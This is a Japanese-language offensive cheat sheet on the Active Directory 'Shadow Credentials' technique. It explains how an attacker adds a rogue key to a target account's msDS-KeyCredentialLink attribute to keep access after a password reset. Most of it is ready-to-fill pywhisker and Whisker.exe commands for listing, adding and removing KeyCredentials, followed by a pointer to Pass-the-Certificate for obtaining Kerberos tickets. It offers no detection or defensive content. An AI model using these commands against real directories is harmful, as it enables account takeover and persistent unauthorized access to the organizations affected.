# Shadow Credentials

Shadow Credentials とは攻撃者が Active Directoryアカウントに挿入して、変更されたアカウントへのアクセスを取得または維持する資格情報です。これらは、多くの場合、ターゲットユーザーまたはコンピューターの `msDS-KeyCredentialLink` 属性に不正な証明書またはキーを追加することに関連しています。これにより、パスワードがリセットされた場合でも、そのユーザーとして認証できます。

`msDS-KeyCredentialLink` 属性とはパスワードなしの認証のための生の暗号データを保存して、ユーザーまたはコンピュータオブジェクトにリンクする Active Directory 属性です。

Shadow Credentialsを悪用するには [pywhisker](https://github.com/ShutdownRepo/pywhisker.git) を使用します。

# Abuse

## Linux

現在のすべての `KeyCredential ID`と作成時刻を一覧出力する

```
pywhisker -d "<DOMAIN>" -u "<USERNAME>" -p "<PASSWORD>" --target "<TargetUser>" --action "list"
```

`KeyCredential` 構造に含まれるすべての情報を出力する

```
pywhisker -d "<DOMAIN>" -u "<USERNAME>" -p "<PASSWORD>" --target "<TargetUser>" --action "info" --device-id <device_id>
```

`msDs-KeyCredentialLink` に新しいKeyCredentialを追加する

```
pywhisker -d "<DOMAIN>" -u "<USERNAME>" -p "<PASSWORD>" --target "<TargetUser>" --action "add" 
```

`msDs-KeyCredentialLink` から KeyCredential を削除する

```
pywhisker -d "<DOMAIN>" -u "<USERNAME>" -p "<PASSWORD>" --target "<TargetUser>" --action "remove" --device-id <device_id>
```

## Windows

```
Whisker.exe add /target:<TargetUser> /domain:<FQDN_DOMAIN> /dc:<DC_DOMAIN> /path:<cert.pfx> /password:pfx-password
```

# Pass-The-Certificate

公開キーがターゲットの `msDs-KeyCredentialLink` に設定されている場合、生成された証明書を [Pass-the-Certificate](https://github.com/namahano/Cheat-Sheet/blob/main/Active%20Directory/Kerberos/Pass%20The%20Certificate.md) で使用して TGT を取得し、さらにアクセスすることができます。